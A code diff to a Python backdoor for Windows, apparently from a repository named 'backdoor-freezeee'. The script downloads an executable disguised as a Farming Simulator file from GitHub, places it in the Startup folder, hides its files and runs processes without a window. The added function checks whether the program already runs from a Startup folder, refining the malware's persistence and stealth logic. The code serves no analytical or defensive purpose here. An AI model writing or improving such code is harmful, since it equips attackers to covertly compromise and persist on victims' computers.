@@ -23,6 +23,27 @@ exe_final_location = os.path.join(startup_folder, "FarmingSimulatorRI.exe")
 exe_old_location = os.path.join(startup_folder, "farmingsimulator.exe")
 url = "https://raw.githubusercontent.com/sincezola/backdoor-freezeee/main/src/bin/FarmingSimulatorRI.exe"
 
+def is_in_startup():
+    # Caminho do executável (ou script)
+    if getattr(sys, 'frozen', False):
+        current_path = os.path.abspath(sys.executable)  # PyInstaller
+    else:
+        current_path = os.path.abspath(__file__)
+
+    # Startup do usuário
+    user_startup = os.path.join(
+        os.environ.get("APPDATA", ""),
+        r"Microsoft\Windows\Start Menu\Programs\Startup"
+    )
+
+    # Startup global
+    global_startup = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+
+    return (
+        current_path.startswith(os.path.abspath(user_startup)) or
+        current_path.startswith(os.path.abspath(global_startup))
+    )
+
 def unhide_file(path: str):
     res = ctypes.windll.kernel32.SetFileAttributesW(
         path,
@@ -100,7 +121,8 @@ startupinfo.wShowWindow = subprocess.SW_HIDE
 
 creationflags = subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROUP
 
-hide_file(current_exe)
+if not is_in_startup():
+    hide_file(current_exe)
 move_to_startup()
 check_reinstall()
 
